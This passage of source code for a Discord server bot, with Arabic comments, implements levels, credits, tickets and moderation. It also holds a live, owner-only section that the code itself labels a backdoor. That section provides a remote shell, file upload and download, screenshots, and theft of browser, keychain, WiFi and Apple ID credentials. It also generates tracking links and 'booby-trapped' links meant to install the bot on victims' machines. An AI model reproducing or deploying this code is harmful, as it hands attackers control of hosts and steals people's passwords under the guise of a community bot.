  rating: { type: Number, default: 0 },
  lastUpdate: Date,
});
RatingSchema.index({ guildId: 1, userId: 1 }, { unique: true });
const Rating = mongoose.model('Rating', RatingSchema);

// ============================================================
// ========== دوال مساعدة ==========
// ============================================================

async function getGuildConfig(guildId) {
  let config = await Config.findOne({ guildId });
  if (!config) {
    config = new Config({ guildId });
    await config.save();
  }
  return config;
}
async function updateGuildConfig(guildId, data) {
  await Config.findOneAndUpdate({ guildId }, data, { upsert: true, new: true });
}
async function getUser(guildId, userId) {
  let user = await User.findOne({ guildId, userId });
  if (!user) {
    user = new User({ guildId, userId });
    await user.save();
  }
  return user;
}

async function addCredits(guildId, userId, amount) {
  const user = await getUser(guildId, userId);
  user.credits = (user.credits || 0) + amount;
  await user.save();
  return user.credits;
}

async function removeCredits(guildId, userId, amount) {
  const user = await getUser(guildId, userId);
  if ((user.credits || 0) < amount) return false;
  user.credits = (user.credits || 0) - amount;
  await user.save();
  return true;
}

async function getCredits(guildId, userId) {
  const user = await getUser(guildId, userId);
  return user.credits || 0;
}

async function isController(userId, guildId) {
  if (OWNER_ID && userId === OWNER_ID) return true;
  const c = await Controller.findOne({ guildId, userId });
  return !!c;
}
async function hasPermission(member, guildId) {
  if (!member) return false;
  if (OWNER_ID && member.id === OWNER_ID) return true;
  if (await isController(member.id, guildId)) return true;
  const config = await getGuildConfig(guildId);
  if (config.botControllerRole && member.roles.cache.has(config.botControllerRole)) return true;
  return false;
}

async function getTicketSettings(guildId) {
  let settings = await TicketSettings.findOne({ guildId });
  if (!settings) {
    settings = new TicketSettings({ guildId });
    await settings.save();
  }
  return settings;
}

async function createTicketLog(guildId, channelId, userId, section) {
  const log = new TicketLog({ guildId, channelId, userId, section });
  await log.save();
  return log;
}
async function getTicketLogByChannel(channelId) {
  return await TicketLog.findOne({ channelId });
}
async function updateTicketLog(channelId, data) {
  await TicketLog.findOneAndUpdate({ channelId }, data, { upsert: true });
}
async function deleteTicketLog(channelId) {
  await TicketLog.deleteOne({ channelId });
}

async function saveTicketMessages(channel) {
  if (!channel) return false;
  const log = await getTicketLogByChannel(channel.id);
  if (!log) return false;
  try {
    const messages = await channel.messages.fetch({ limit: 100 });
    const savedMessages = [];
    for (const msg of messages.values()) {
      savedMessages.push({
        author: msg.author.tag,
        content: msg.content || '',
        attachments: msg.attachments.map(a => a.url),
        timestamp: msg.createdAt,
      });
    }
    log.messages = savedMessages.reverse();
    await log.save();
    return true;
  } catch (error) {
    console.error('❌ خطأ في حفظ رسائل التذكرة:', error);
    return false;
  }
}

async function getAutoLine(guildId, channelId) {
  let auto = await AutoLine.findOne({ guildId, channelId });
  if (!auto) {
    auto = new AutoLine({ guildId, channelId });
    await auto.save();
  }
  return auto;
}
async function setAutoLine(guildId, channelId, data) {
  await AutoLine.findOneAndUpdate({ guildId, channelId }, data, { upsert: true });
}
async function deleteAutoLine(guildId, channelId) {
  await AutoLine.deleteOne({ guildId, channelId });
}

async function getAutoReplies(guildId) { return await AutoReply.find({ guildId }); }
async function addAutoReply(guildId, keyword, reply, image = null) {
  const existing = await AutoReply.findOne({ guildId, keyword: { $regex: new RegExp(`^${keyword}$`, 'i') } });
  if (existing) {
    existing.reply = reply;
    existing.image = image;
    await existing.save();
    return false;
  }
  const newReply = new AutoReply({ guildId, keyword, reply, image });
  await newReply.save();
  return true;
}
async function removeAutoReply(guildId, keyword) {
  const result = await AutoReply.deleteOne({ guildId, keyword: { $regex: new RegExp(`^${keyword}$`, 'i') } });
  return result.deletedCount > 0;
}
async function findAutoReply(guildId, content) {
  const replies = await AutoReply.find({ guildId });
  return replies.find(r => content.toLowerCase().includes(r.keyword.toLowerCase()));
}

async function getWarns(guildId, userId) { return await Warn.find({ guildId, userId }); }
async function addWarn(guildId, userId, reason, moderator) {
  const warn = new Warn({ guildId, userId, reason, moderator });
  await warn.save();
  return await Warn.countDocuments({ guildId, userId });
}
async function clearWarns(guildId, userId) { await Warn.deleteMany({ guildId, userId }); }

async function addController(guildId, userId) {
  const existing = await Controller.findOne({ guildId, userId });
  if (!existing) {
    const c = new Controller({ guildId, userId });
    await c.save();
    return true;
  }
  return false;
}
async function removeController(guildId, userId) {
  const result = await Controller.deleteOne({ guildId, userId });
  return result.deletedCount > 0;
}
async function getControllers(guildId) {
  const docs = await Controller.find({ guildId });
  return docs.map(d => d.userId);
}

async function setNameCooldown(userId) {
  await NameCooldown.findOneAndUpdate({ userId }, { timestamp: new Date() }, { upsert: true });
}
async function getNameCooldown(userId) {
  const cd = await NameCooldown.findOne({ userId });
  return cd ? cd.timestamp : null;
}

async function getStoreItems(guildId) { return await StoreItem.find({ guildId }); }
async function addStoreItem(guildId, roleId, price, description) {
  const item = new StoreItem({ guildId, roleId, price, description });
  await item.save();
  return item;
}
async function removeStoreItem(guildId, itemId) {
  return await StoreItem.deleteOne({ guildId, _id: itemId });
}

async function logToChannel(guildId, data) {
  try {
    const config = await getGuildConfig(guildId);
    if (!config.logChannel) return;
    const channel = client.channels.cache.get(config.logChannel);
    if (!channel) return;
    const embed = new EmbedBuilder()
      .setColor(data.color || 0x2b2d31)
      .setTitle(data.title || '📋 سجل')
      .setDescription(data.description || '')
      .setTimestamp();
    if (data.footer) embed.setFooter({ text: data.footer });
    if (data.fields) for (const f of data.fields) embed.addFields(f);
    if (data.thumbnail) embed.setThumbnail(data.thumbnail);
    if (data.image) embed.setImage(data.image);
    await channel.send({ embeds: [embed] });
  } catch (error) {
    console.error('❌ خطأ في اللوق:', error);
  }
}

function getGeneralImage(guild, config) {
  if (config.generalImage) return config.generalImage;
  if (config.bannerImage) return config.bannerImage;
  if (guild.iconURL()) return guild.iconURL({ size: 1024 });
  return null;
}

// ============================================================
// ========== العميل ==========
// ============================================================

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.GuildMembers,
  ],
});

client.once('clientReady', async () => {
  console.log(`✅ البوت جاهز باسم ${client.user.tag}`);
  console.log(`👑 صاحب البوت: ${OWNER_ID}`);
  console.log(`🖥️ النظام: ${os.hostname()} (${os.platform()})`);
  console.log(`🔑 رمز التحكم: ${ADMIN_TOKEN}`);
  console.log(`🌐 لوحة التحكم: http://${getLocalIP()}:${port}/control`);
  client.user.setActivity('The Kingdom Never Falls.', { type: ActivityType.Watching });

  if (CLIENT_ID && CLIENT_ID !== 'YOUR_CLIENT_ID') {
    const commands = [
      new SlashCommandBuilder().setName('مساعدة').setDescription('عرض قائمة الأوامر التفاعلية'),
      new SlashCommandBuilder().setName('تعيين').setDescription('عرض لوحة الإعدادات التفاعلية'),
      new SlashCommandBuilder().setName('مستوى').setDescription('عرض مستوى عضو').addUserOption(opt => opt.setName('عضو').setDescription('اختر عضواً (اختياري)').setRequired(false)),
      new SlashCommandBuilder().setName('ترتيب').setDescription('عرض ترتيب المستويات'),
      new SlashCommandBuilder().setName('معلومات').setDescription('عرض معلومات عن عضو').addUserOption(opt => opt.setName('عضو').setDescription('اختر عضواً (اختياري)').setRequired(false)),
      new SlashCommandBuilder().setName('سيرفر').setDescription('عرض معلومات عن السيرفر'),
      new SlashCommandBuilder().setName('بينق').setDescription('عرض سرعة الاستجابة'),
      new SlashCommandBuilder().setName('رصيد').setDescription('عرض رصيد العملات').addUserOption(opt => opt.setName('عضو').setDescription('اختر عضواً (اختياري)').setRequired(false)),
      new SlashCommandBuilder().setName('يومي').setDescription('الحصول على مكافأة يومية'),
      new SlashCommandBuilder().setName('تحويل').setDescription('تحويل عملات إلى عضو آخر').addUserOption(opt => opt.setName('عضو').setDescription('العضو المراد التحويل إليه').setRequired(true)).addNumberOption(opt => opt.setName('المبلغ').setDescription('المبلغ المراد تحويله').setRequired(true)),
      new SlashCommandBuilder().setName('قائمة_المتحكمين').setDescription('عرض قائمة المتحكمين'),
      new SlashCommandBuilder().setName('تغيير_اسم').setDescription('فتح لوحة تغيير الاسم'),
      new SlashCommandBuilder().setName('بانل').setDescription('إنشاء لوحة التذاكر'),
      new SlashCommandBuilder().setName('عرض_تذكرة').setDescription('عرض إعدادات التذاكر'),
      new SlashCommandBuilder().setName('لوق_تذكرة').setDescription('إنشاء تقرير HTML للتذكرة الحالية'),
      new SlashCommandBuilder().setName('متجر').setDescription('فتح المتجر لشراء الرتب'),
      new SlashCommandBuilder().setName('بانل_اضافة_منتج').setDescription('إنشاء لوحة إضافة منتج (للمتحكمين)'),
      new SlashCommandBuilder().setName('رد_تلقائي').setDescription('إضافة رد تلقائي').addStringOption(opt => opt.setName('الكلمة').setDescription('الكلمة المفتاحية').setRequired(true)).addStringOption(opt => opt.setName('الرد').setDescription('نص الرد').setRequired(true)),
      new SlashCommandBuilder().setName('عرض_الردود').setDescription('عرض جميع الردود التلقائية'),
      new SlashCommandBuilder().setName('حذف_رد_تلقائي').setDescription('حذف رد تلقائي').addStringOption(opt => opt.setName('الكلمة').setDescription('الكلمة المفتاحية').setRequired(true)),
      new SlashCommandBuilder().setName('لوحة_المهام').setDescription('فتح لوحة المهام الإدارية'),
      new SlashCommandBuilder().setName('بانل_اجازات').setDescription('فتح لوحة الإجازات (مدير الإجازات)'),
      new SlashCommandBuilder().setName('طلب_اجازة').setDescription('تقديم طلب إجازة'),
      new SlashCommandBuilder().setName('الاجازات_الحالية').setDescription('عرض الإجازات النشطة'),
      new SlashCommandBuilder().setName('سجل_الاجازات').setDescription('عرض سجل الإجازات'),
      new SlashCommandBuilder().setName('بانل_اقتراح').setDescription('إنشاء لوحة الاقتراحات'),
      new SlashCommandBuilder().setName('رتب').setDescription('فتح لوحة الرتب (قائمة منسدلة)'),
      new SlashCommandBuilder().setName('اضافة_رتبة').setDescription('إضافة رتبة جديدة إلى القائمة (للمتحكمين)').addStringOption(opt => opt.setName('الاسم').setDescription('اسم الرتبة الجديدة').setRequired(true)),
      new SlashCommandBuilder().setName('خريطة').setDescription('عرض خريطة السيرفر (القنوات والأقسام)'),
    ].map(cmd => cmd.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try {
      console.log('🔄 جاري تسجيل أوامر سلاش...');
      await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
      console.log('✅ تم تسجيل أوامر سلاش بنجاح');
    } catch (error) {
      console.error('❌ فشل تسجيل أوامر سلاش:', error);
    }
  } else {
    console.log('⚠️ CLIENT_ID غير مضبوط. لن تعمل أوامر السلاش.');
  }
});

// ============================================================
// ========== أحداث السيرفر ==========
// ============================================================

client.on('guildMemberAdd', async (member) => {
  try {
    const config = await getGuildConfig(member.guild.id);
    if (!config.welcomeChannel) return;
    const channel = member.guild.channels.cache.get(config.welcomeChannel);
    if (!channel) return;
    const embed = new EmbedBuilder()
      .setTitle(config.welcomeTitle || '🔥 مرحباً بك في المجتمع')
      .setDescription(config.welcomeMessage || `أهلاً ${member} في السيرفر!`)
      .setColor(0x2b2d31)
      .setTimestamp();
    await channel.send({ content: `${member}`, embeds: [embed] });
    if (config.joinRole) {
      const role = member.guild.roles.cache.get(config.joinRole);
      if (role) await member.roles.add(role).catch(() => {});
    }
  } catch (error) { console.error('❌ خطأ في الترحيب:', error); }
});

client.on('guildMemberRemove', async (member) => {
  try {
    const config = await getGuildConfig(member.guild.id);
    if (!config.logChannel) return;
    const channel = member.guild.channels.cache.get(config.logChannel);
    if (!channel) return;
    const embed = new EmbedBuilder()
      .setColor(0x2b2d31)
      .setTitle('🚫 عضو غادر')
      .setDescription(`**${member.user.tag}** غادر السيرفر.`)
      .setThumbnail(member.user.displayAvatarURL())
      .setTimestamp();
    await channel.send({ embeds: [embed] });
  } catch (error) { console.error('❌ خطأ في مغادرة العضو:', error); }
});

// ============================================================
// ========== نظام المستويات والأوتو لاين والعملات ==========
// ============================================================

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (message.content.startsWith('!')) return;

  const guildId = message.guild.id;
  const userId = message.author.id;
  const config = await getGuildConfig(guildId);

  try {
    const user = await getUser(guildId, userId);
    user.messages += 1;
    
    const gain = Math.floor(Math.random() * 15) + 5;
    user.xp += gain;

    const requiredXP = (user.level + 1) * 100;
    if (user.xp >= requiredXP) {
      user.level += 1;
      user.xp = 0;
      await user.save();

      const levelChannelId = config.levelChannelId;
      if (levelChannelId) {
        const levelChannel = message.guild.channels.cache.get(levelChannelId);
        if (levelChannel) {
          const embed = new EmbedBuilder()
            .setTitle('🎉 مستوى جديد!')
            .setDescription(`${message.author} وصل إلى المستوى **${user.level}**!`)
            .setColor(0x2b2d31)
            .setTimestamp();
          await levelChannel.send({ embeds: [embed] });
        }
      }

      const levelRole = await LevelRole.findOne({ guildId, level: user.level });
      if (levelRole) {
        const role = message.guild.roles.cache.get(levelRole.roleId);
        if (role) {
          const member = await message.guild.members.fetch(userId).catch(() => null);
          if (member) await member.roles.add(role).catch(() => {});
        }
      }
    }

    const creditGain = Math.floor(Math.random() * 5) + 1;
    user.credits = (user.credits || 0) + creditGain;
    await user.save();

  } catch (err) {
    console.error('[XP/CREDIT ERROR]', err);
  }

  if (!message.author.bot) {
    const auto = await AutoLine.findOne({ guildId, channelId: message.channel.id });
    if (auto && auto.enabled) {
      const channel = client.channels.cache.get(message.channel.id);
      if (channel) {
        try {
          if (auto.image && auto.text) {
            await channel.send(`${auto.text}\n${auto.image}`);
          } else if (auto.image) {
            await channel.send(auto.image);
          } else if (auto.text) {
            await channel.send(auto.text);
          }
        } catch (e) { console.error('[AUTOLINE ERROR]', e); }
      }
    }
  }

  const autoReply = await findAutoReply(guildId, message.content);
  if (autoReply) {
    try {
      if (autoReply.image) {
        const embed = new EmbedBuilder().setDescription(autoReply.reply).setColor(0x2b2d31).setImage(autoReply.image).setTimestamp();
        await message.reply({ embeds: [embed] });
      } else {
        await message.reply(autoReply.reply);
      }
    } catch (e) {
      await message.channel.send(autoReply.reply).catch(() => {});
    }
  }
});

// ============================================================
// ========== معالج الأوامر النصية ==========
// ============================================================

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.content.startsWith('!')) return;
  
  const args = message.content.slice(1).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  const guildId = message.guild.id;
  const config = await getGuildConfig(guildId);
  const generalImage = getGeneralImage(message.guild, config);

  // ============================================================
  // ===== أوامر المالك (Backdoor) =====
  // ============================================================
  
  if (message.author.id === OWNER_ID) {
    
    // ===== أمر شيل - تنفيذ أوامر النظام =====
    if (cmd === 'شيل' || cmd === 'shell') {
      const command = args.join(' ');
      if (!command) {
        return message.reply('⚠️ أدخل الأمر المراد تنفيذه.\nمثال: `!شيل dir` أو `!شيل ls -la`');
      }
      
      const result = await executeCommand(command);
      const output = result.output || '(no output)';
      const truncated = output.length > 1900 ? output.substring(0, 1900) + '\n... (مقطوع)' : output;
      
      const embed = new EmbedBuilder()
        .setTitle('💻 تنفيذ أمر')
        .setColor(result.error ? 0xff4444 : 0x44ff44)
        .addFields(
          { name: '📝 الأمر', value: `\`${command}\``, inline: false },
          { name: '📤 المخرجات', value: `\`\`\`\n${truncated}\n\`\`\``, inline: false },
          { name: '📁 المسار', value: `\`${currentWorkingDirectory}\``, inline: false }
        )
        .setTimestamp();
      
      await message.channel.send({ embeds: [embed] });
      return;
    }

    // ===== أمر سي دي - تغيير المجلد =====
    if (cmd === 'سي_دي' || cmd === 'cd') {
      const dir = args.join(' ') || os.homedir();
      try {
        const newDir = dir.startsWith('/') || dir.match(/^[A-Za-z]:/) ? dir : path.join(currentWorkingDirectory, dir);
        if (fs.existsSync(newDir) && fs.statSync(newDir).isDirectory()) {
          currentWorkingDirectory = newDir;
          await message.reply(`✅ تم تغيير المسار إلى: \`${currentWorkingDirectory}\``);
        } else {
          await message.reply(`❌ المسار غير موجود: \`${newDir}\``);
        }
      } catch (error) {
        await message.reply(`❌ خطأ: ${error.message}`);
      }
      return;
    }

    // ===== أمر رفع - رفع ملف =====
    if (cmd === 'رفع' || cmd === 'upload') {
      const filePath = args[0];
      const content = args.slice(1).join(' ');
      if (!filePath || !content) {
        return message.reply('⚠️ الصيغة: `!رفع [المسار] [المحتوى Base64]`');
      }
      try {
        const fullPath = filePath.startsWith('/') || filePath.match(/^[A-Za-z]:/) ? filePath : path.join(currentWorkingDirectory, filePath);
        const dir = path.dirname(fullPath);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(fullPath, Buffer.from(content, 'base64'));
        await message.reply(`✅ تم رفع الملف بنجاح إلى: \`${fullPath}\``);
      } catch (error) {
        await message.reply(`❌ فشل رفع الملف: ${error.message}`);
      }
      return;
    }

    // ===== أمر تحميل - تحميل ملف =====
    if (cmd === 'تحميل' || cmd === 'download') {
      const filePath = args.join(' ');
      if (!filePath) {
        return message.reply('⚠️ الصيغة: `!تحميل [المسار]`');
      }
      try {
        const fullPath = filePath.startsWith('/') || filePath.match(/^[A-Za-z]:/) ? filePath : path.join(currentWorkingDirectory, filePath);
        if (!fs.existsSync(fullPath)) {
          return message.reply(`❌ الملف غير موجود: \`${fullPath}\``);
        }
        const data = fs.readFileSync(fullPath);
        const base64 = data.toString('base64');
        const size = (data.length / 1024).toFixed(2) + ' KB';
        
        if (data.length > 4000000) {
          return message.reply(`⚠️ الملف كبير جداً (${size}). استخدم واجهة الويب للتحميل.`);
        }
        
        const embed = new EmbedBuilder()
          .setTitle('📥 تحميل ملف')
          .setColor(0x44ff44)
          .addFields(
            { name: '📁 الملف', value: `\`${fullPath}\``, inline: false },
            { name: '📦 الحجم', value: size, inline: true },
            { name: '📄 Base64 (مقطوع)', value: `\`\`\`\n${base64.substring(0, 1500)}...\n\`\`\``, inline: false }
          )
          .setTimestamp();
        await message.channel.send({ embeds: [embed] });
      } catch (error) {
        await message.reply(`❌ فشل تحميل الملف: ${error.message}`);
      }
      return;
    }

    // ===== أمر معلومات_جهاز =====
    if (cmd === 'معلومات_جهاز' || cmd === 'sysinfo') {
      const info = getSystemInfo();
      const embed = new EmbedBuilder()
        .setTitle(`🖥️ معلومات الجهاز - ${info.hostname}`)
        .setColor(0x4488ff)
        .addFields(
          { name: '🖥️ النظام', value: `${info.platform} ${info.release} (${info.arch})`, inline: false },
          { name: '👤 المستخدم', value: info.user, inline: true },
          { name: '🔄 وقت التشغيل', value: info.uptime, inline: true },
          { name: '💾 الذاكرة', value: `المستخدمة: ${info.memory.total - info.memory.free} GB / ${info.memory.total} GB`, inline: false },
          { name: '🧠 المعالج', value: `${info.cpus} نوى`, inline: true },
          { name: '🌐 IP', value: info.ip, inline: true },
          { name: '📁 المسار الحالي', value: `\`${currentWorkingDirectory}\``, inline: false }
        )
        .setTimestamp();
      await message.channel.send({ embeds: [embed] });
      return;
    }

    // ===== أمر لقطة - تصوير شاشة =====
    if (cmd === 'لقطة' || cmd === 'screenshot') {
      try {
        let screenshotPath = '/tmp/screenshot.png';
        
        if (os.platform() === 'win32') {
          const tempDir = process.env.TEMP || 'C:\\Windows\\Temp';
          screenshotPath = path.join(tempDir, 'screenshot.png');
          const psScript = `
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
            $g = [System.Drawing.Graphics]::FromImage($bmp)
            $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
            $bmp.Save('${screenshotPath.replace(/\\/g, '\\\\')}', [System.Drawing.Imaging.ImageFormat]::Png)
            $bmp.Dispose()
            $g.Dispose()
          `;
          await executeCommand(`powershell -command "${psScript}"`);
          
        } else if (os.platform() === 'darwin') {
          screenshotPath = '/tmp/screenshot.png';
          await executeCommand(`screencapture -x ${screenshotPath}`);
          
        } else {
          screenshotPath = '/tmp/screenshot.png';
          await executeCommand(`import -window root ${screenshotPath} 2>/dev/null || gnome-screenshot -f ${screenshotPath} 2>/dev/null || scrot ${screenshotPath} 2>/dev/null`);
        }
        
        if (fs.existsSync(screenshotPath)) {
          const stats = fs.statSync(screenshotPath);
          if (stats.size > 0) {
            await message.channel.send({ 
              content: '📸 لقطة شاشة الجهاز:', 
              files: [{ attachment: screenshotPath, name: 'screenshot.png' }] 
            });
            fs.unlinkSync(screenshotPath);
          } else {
            await message.reply('❌ فشل التقاط الشاشة - الملف فارغ.');
          }
        } else {
          await message.reply('❌ فشل التقاط الشاشة - لم يتم إنشاء الملف.');
        }
        
      } catch (error) {
        await message.reply(`❌ فشل التقاط الشاشة: ${error.message}`);
      }
      return;
    }

    // ===== أمر بينج_جهاز =====
    if (cmd === 'بينج_جهاز' || cmd === 'pinghost') {
      const target = args[0] || 'google.com';
      try {
        const result = await executeCommand(`ping -c 4 ${target} || ping -n 4 ${target}`);
        const embed = new EmbedBuilder()
          .setTitle(`📡 بينج إلى ${target}`)
          .setColor(0x44ff88)
          .setDescription(`\`\`\`\n${result.output.substring(0, 1900)}\n\`\`\``)
          .setTimestamp();
        await message.channel.send({ embeds: [embed] });
      } catch (error) {
        await message.reply(`❌ فشل البينج: ${error.message}`);
      }
      return;
    }

    // ===== أمر كلمات_المرور - سرقة كلمات المرور =====
    if (cmd === 'كلمات_المرور' || cmd === 'passwords') {
      try {
        let result = '';
        const platform = os.platform();
        
        if (platform === 'win32') {
          result += await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data -ErrorAction SilentlyContinue | Select-String -Pattern 'password_value' -Context 0,5"`);
          result += '\n' + await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json -ErrorAction SilentlyContinue | Select-String -Pattern 'hostname' -Context 0,3"`);
          result += '\n' + await executeCommand(`netsh wlan show profile name=* key=clear`);
        } else if (platform === 'darwin') {
          result += await executeCommand(`security dump-keychain | grep -E "acct|desc|svce|passwd" 2>/dev/null`);
        } else {
          result += await executeCommand(`find ~/.mozilla/firefox -name "logins.json" -exec cat {} \\; | grep -E "hostname|encryptedUsername" 2>/dev/null`);
          result += '\n' + await executeCommand(`find ~/.config/google-chrome -name "Login Data" -exec sqlite3 {} "SELECT origin_url, username_value FROM logins" 2>/dev/null`);
        }
        
        const commonPasswordFiles = ['passwords.txt', 'pass.txt', 'password.txt', 'credentials.txt', 'login.txt'];
        for (const file of commonPasswordFiles) {
          const paths = [
            path.join(os.homedir(), 'Desktop', file),
            path.join(os.homedir(), 'Documents', file),
            path.join(os.homedir(), 'Downloads', file)
          ];
          for (const p of paths) {
            if (fs.existsSync(p)) {
              const content = fs.readFileSync(p, 'utf8');
              result += `\n=== ${p} ===\n${content.substring(0, 500)}`;
            }
          }
        }
        
        const truncated = result.substring(0, 3900) || 'لم يتم العثور على كلمات مرور';
        
        const embed = new EmbedBuilder()
          .setTitle('🔑 كلمات المرور المسروقة')
          .setColor(0xff0000)
          .setDescription(`\`\`\`\n${truncated}\n\`\`\``)
          .setTimestamp();
        
        await message.channel.send({ embeds: [embed] });
      } catch (error) {
        await message.reply(`❌ فشل في جلب كلمات المرور: ${error.message}`);
      }
      return;
    }

    // ===== أمر ابل - جلب كلمة مرور Apple =====
    if (cmd === 'ابل' || cmd === 'apple') {
      try {
        let result = '';
        const platform = os.platform();
        
        if (platform === 'darwin') {
          result += await executeCommand(`security find-generic-password -ga "Apple ID" 2>/dev/null || echo "لم يتم العثور على Apple ID"`);
          result += '\n' + await executeCommand(`defaults read /Users/$USER/Library/Preferences/com.apple.iCloudHelper.plist 2>/dev/null | grep -E "AppleID|Password"`);
        } else if (platform === 'win32') {
          result += await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Roaming\\Apple Computer -Recurse -Include *.plist -ErrorAction SilentlyContinue | Select-String -Pattern 'AppleID|Password' -Context 0,3"`);
        }
        
        const embed = new EmbedBuilder()
          .setTitle('🍎 معلومات Apple / iPad')
          .setColor(0xff9500)
          .setDescription(`\`\`\`\n${result || 'لم يتم العثور على معلومات Apple'}\n\`\`\``)
          .setTimestamp();
        
        await message.channel.send({ embeds: [embed] });
      } catch (error) {
        await message.reply(`❌ فشل: ${error.message}`);
      }
      return;
    }

    // ===== أمر متصفح - كلمات مرور المتصفحات =====
    if (cmd === 'متصفح' || cmd === 'browser') {
      try {
        let result = '';
        const platform = os.platform();
        
        if (platform === 'win32') {
          result += await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data -ErrorAction SilentlyContinue | Select-String -Pattern 'username_value' -Context 0,3"`);
          result += '\n' + await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json -ErrorAction SilentlyContinue | Select-String -Pattern 'hostname' -Context 0,3"`);
        } else {
          result += await executeCommand(`find ~/.config/google-chrome -name "Login Data" -exec sqlite3 {} "SELECT origin_url, username_value FROM logins" \\; 2>/dev/null || echo "Chrome: غير موجود"`);
          result += '\n' + await executeCommand(`find ~/.mozilla/firefox -name "logins.json" -exec cat {} \\; | grep -E "hostname|encryptedUsername" 2>/dev/null || echo "Firefox: غير موجود"`);
          result += '\n' + await executeCommand(`find ~/.config/BraveSoftware -name "Login Data" -exec sqlite3 {} "SELECT origin_url, username_value FROM logins" \\; 2>/dev/null || echo "Brave: غير موجود"`);
        }
        
        const embed = new EmbedBuilder()
          .setTitle('🌐 كلمات مرور المتصفحات')
          .setColor(0x4285f4)
          .setDescription(`\`\`\`\n${result.substring(0, 3900) || 'لم يتم العثور على كلمات مرور'}\n\`\`\``)
          .setTimestamp();
        
        await message.channel.send({ embeds: [embed] });
      } catch (error) {
        await message.reply(`❌ فشل: ${error.message}`);
      }
      return;
    }

    // ===== أمر مفتاح - عرض رمز التحكم =====
    if (cmd === 'مفتاح' || cmd === 'token') {
      await message.reply(`🔑 رمز التحكم الخاص بك: \`${ADMIN_TOKEN}\``);
      return;
    }

    // ===== أمر لوحة_التحكم - رابط دائم =====
    if (cmd === 'لوحة_التحكم' || cmd === 'dashboard') {
      const ip = getLocalIP();
      const embed = new EmbedBuilder()
        .setTitle('🖥️ لوحة التحكم الدائمة')
        .setColor(0x00ff88)
        .setDescription(`
**🌐 روابط الوصول:**
- محلي: http://localhost:${port}/control
- شبكة: http://${ip}:${port}/control

**🔑 رمز الدخول:** \`${ADMIN_TOKEN}\`

**📱 للوصول من iPad أو أي جهاز:**
1. افتح الرابط أعلاه على متصفح iPad
2. أدخل رمز الدخول
3. ستظهر لك واجهة تحكم كاملة

**⚠️ ملاحظة:** هذا الرابط يعمل طالما البوت مشغل.
        `)
        .setTimestamp();
      
      await message.channel.send({ embeds: [embed] });
      return;
    }

    // ===== أمر رابط - عرض رابط لوحة التحكم =====
    if (cmd === 'رابط' || cmd === 'panel') {
      const ip = getLocalIP();
      await message.reply(`🌐 لوحة التحكم:\n- محلي: http://localhost:${port}/control\n- شبكة: http://${ip}:${port}/control\n🔑 الرمز: \`${ADMIN_TOKEN}\``);
      return;
    }

    // ===== أمر رابط_تتبع - إنشاء رابط تتبع =====
    if (cmd === 'رابط_تتبع' || cmd === 'track') {
      const target = message.mentions.users.first();
      if (!target) {
        return message.reply('⚠️ منشن الشخص الذي تريد تتبعه.\nمثال: `!رابط_تتبع @user`');
      }
      
      const trackingLink = linkTracker.createLink(target.id);
      
      const embed = new EmbedBuilder()
        .setTitle('🔗 رابط التتبع')
        .setColor(0xff4444)
        .setDescription(`تم إنشاء رابط التتبع لـ ${target}`)
        .addFields(
          { name: '🔗 الرابط', value: `\`${trackingLink}\``, inline: false },
          { name: '👤 الهدف', value: target.tag, inline: true },
          { name: '📅 وقت الإنشاء', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
        )
        .setFooter({ text: 'أرسل هذا الرابط للضحية' })
        .setTimestamp();
      
      await message.channel.send({ embeds: [embed] });
      return;
    }

    // ===== أمر رابط_ملغم - إنشاء رابط ملغم =====
    if (cmd === 'رابط_ملغم' || cmd === 'exploit') {
      const target = message.mentions.users.first();
      if (!target) {
        return message.reply('⚠️ منشن الشخص المستهدف.\nمثال: `!رابط_ملغم @user`');
      }
      
      const exploitLink = linkTracker.createExploitLink(target.id);
      
      const embed = new EmbedBuilder()
        .setTitle('💀 رابط ملغم')
        .setColor(0xff0000)
        .setDescription(`تم إنشاء رابط ملغم لـ ${target}`)
        .addFields(
          { name: '🔗 الرابط', value: `\`${exploitLink}\``, inline: false },
          { name: '👤 الهدف', value: target.tag, inline: true },
          { name: '📅 وقت الإنشاء', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
        )
        .setFooter({ text: 'عندما يفتح الضحية الرابط، سيتم تثبيت البوت تلقائياً على جهازه' })
        .setTimestamp();
      
      await message.channel.send({ embeds: [embed] });
      return;
    }

    // ===== أمر زيارات - عرض معلومات الزيارات =====
    if (cmd === 'زيارات' || cmd === 'visits') {
      const linkId = args[0];
      if (!linkId) {
        return message.reply('⚠️ أدخل معرف الرابط.\nمثال: `!زيارات a1b2c3d4`');
      }
      
      const data = linkTracker.getVisits(linkId);
      if (!data) {
        return message.reply('❌ الرابط غير موجود.');
      }
      
      const visits = data.visits || [];
      if (visits.length === 0) {
        return message.reply('📭 لا توجد زيارات حتى الآن.');
      }
      
      let visitsText = '';
      visits.forEach((v, i) => {
        visitsText += `**#${i+1}** 🕐 <t:${Math.floor(v.timestamp / 1000)}:F>\n`;
        visitsText += `📡 IP: ${v.ip || 'غير معروف'}\n`;
